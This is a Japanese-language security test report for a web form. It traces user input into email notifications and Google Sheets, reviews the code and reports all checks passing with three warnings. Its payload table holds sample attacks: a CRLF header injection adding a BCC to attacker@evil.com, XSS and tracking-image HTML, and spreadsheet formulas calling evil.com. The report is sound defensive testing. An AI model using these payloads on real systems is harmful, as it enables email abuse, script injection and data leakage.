# 外部サービス連携 セキュリティテスト結果

実行日時: 2026-02-15 08:59

## データフロー

### [text] (rawText)
```
submit/route.ts:92  — formData.get("text") で取得
submit/route.ts:100 — バリデーション: 空文字チェック (.trim())
submit/route.ts:121 — バリデーション: 最大2000文字
submit/route.ts:168 — DB保存: raw_text として生のまま保存（パラメータ化クエリ）
submit/route.ts:179 — backgroundPayload.rawText に生のまま渡す
  → notify-email.ts:89  — テキスト本文: 生のまま埋め込み（plain text = 安全）
  → notify-email.ts:113 — HTML本文: escapeHtml(payload.rawText) でエスケープ済み ✅
  → google-sheets.ts:194 — Sheet1 H列: valueInputOption:"RAW" で書き込み ✅
```

### [reporter_name] (displayName)
```
submit/route.ts:94  — formData.get("reporter_name") で取得
submit/route.ts:98  — サニタイズ: trim().slice(0, 50) で50文字に切り詰め
submit/route.ts:175 — displayName = reporterName || "匿名（とくめい）"
submit/route.ts:187 — backgroundPayload.reporterName
  → notify-email.ts:66  — displayName 再構築
  → notify-email.ts:87  — テキスト本文: 生のまま（plain text = 安全）
  → notify-email.ts:111 — HTML本文: escapeHtml(displayName) でエスケープ済み ✅
  → google-sheets.ts:176,190 — Sheet1 D列: valueInputOption:"RAW" で書き込み ✅
```

### [emotion]
```
submit/route.ts:91  — formData.get("emotion") で取得
submit/route.ts:107 — ホワイトリスト検証: ["red", "yellow", "blue"] のみ許可 ✅
submit/route.ts:178 — backgroundPayload.emotion
  → notify-email.ts:63  — EMOTION_LABELS マッピング（ホワイトリスト値のみ）
  → notify-email.ts:78  — Subject: EMOTION_SUBJECT_LABELS マッピング（ホワイトリスト値のみ）
  → notify-email.ts:112 — HTML: escapeHtml(emotionLabel) ✅
  → google-sheets.ts:175,191 — Sheet1 E列: ラベル変換済み、RAWモード ✅
```

### [base_id] → baseName
```
submit/route.ts:93  — formData.get("base_id") で取得
submit/route.ts:114 — ホワイトリスト検証: BASE_MAP に存在する値のみ許可 ✅
submit/route.ts:173 — baseName = getBaseLabel(baseId) — 制御された値
  → notify-email.ts:77  — Subject: "${baseName}："（ホワイトリスト値）
  → notify-email.ts:103 — HTML: escapeHtml(payload.baseName) ✅
  → google-sheets.ts:189,213 — Sheet1 C列: RAWモード ✅
```

### [AI分析結果: summary, category, priority]
```
submit/route.ts:170 — analyzeWithAi(emotion, text) で生成
  → ai.ts: validateAiResult() でカテゴリ・優先度を検証（ホワイトリスト + 範囲チェック）
submit/route.ts:183-186 — backgroundPayload に渡す
  → notify-email.ts:90  — summary: テキスト本文（plain text = 安全）
  → notify-email.ts:114 — summary: escapeHtml(payload.summary) ✅
  → google-sheets.ts:193 — category: Sheet1 G列 RAWモード ✅
  → google-sheets.ts:192 — priority: Sheet1 F列 RAWモード（数値）✅
  → google-sheets.ts:195,216 — summary: Sheet1 I列 / 対応管理シート F列 RAWモード ✅
```

## コードレビュー結果

| # | テスト項目 | 判定 | 証拠（行番号） | 備考 |
|---|-----------|------|---------------|------|
| 1 | メールヘッダインジェクション | PASS | notify-email.ts:43-44,78 | To/From は環境変数のみ。Subject は BASE_MAP + EMOTION_SUBJECT_LABELS のホワイトリスト値のみ。ユーザー入力はヘッダーに含まれない |
| 2 | メール本文インジェクション | PASS | notify-email.ts:111,113,114 | HTML本文の全ユーザー入力が escapeHtml() を経由。テキスト本文は plain text で安全 |
| 3 | シート数式インジェクション | PASS | google-sheets.ts:183,207 | 全書き込みが valueInputOption:"RAW"。USER_ENTERED は 0箇所。数式として解釈されない |
| 4 | エラー時情報漏洩 | PASS | submit/route.ts:196-201 | rejected reason は console.error のみ。レスポンスには { id, feedback_to_user, summary } のみ含まれる |
| 5 | メール送信DoS耐性 | PASS | rate-limit.ts:53-54 | 投稿3件/分(IP) + 30件/分(グローバル)で制御。Gmail 500通/日で追加制限 |
| 6 | Sheets認証情報保護 | PASS | google-sheets.ts:46-47 | 全て process.env から取得。フロントエンドに GOOGLE_ / NEXT_PUBLIC_GOOGLE_ 参照なし |

## ペイロード送信テスト結果

| テスト | ペイロード | レスポンス | 判定 |
|--------|-----------|-----------|------|
| ヘッダインジェクション | reporter_name=`テスト\r\nBCC: attacker@evil.com` | HTTP 200 | PASS — reporter_name はメール本文にのみ使用、ヘッダーには含まれない |
| HTMLインジェクション | text=`<a href="http://evil.com">クリック</a><img src="http://evil.com/track.gif"><script>alert("xss")</script>` | HTTP 200 | PASS — HTML本文で escapeHtml() によりタグが無効化 |
| 数式インジェクション | text=`=IMPORTXML("http://evil.com","//body") =IMAGE("http://evil.com/track.gif")` | HTTP 200 | PASS — valueInputOption:"RAW" により数式は実行されない |

## 脆弱性一覧

なし（全項目 PASS）

## テスト全体サマリー

```
PASS: 50
FAIL: 0
WARN: 3
合計: 53
認証状態: AUTH_AVAILABLE=true
```

### WARN 内訳（既知の設計上の制約）
1. CSRF: Hostヘッダー空でHTTP 400 — Next.jsがHostを補完する可能性があるが、実害なし
2. IDOR: 別base_idのレポートを変更可能 — シングルテナント設計の仕様（管理者は全拠点管理）
3. レートリミット: 異なるIPで各3件ずつ送信可能 — グローバル30件/分上限で制限
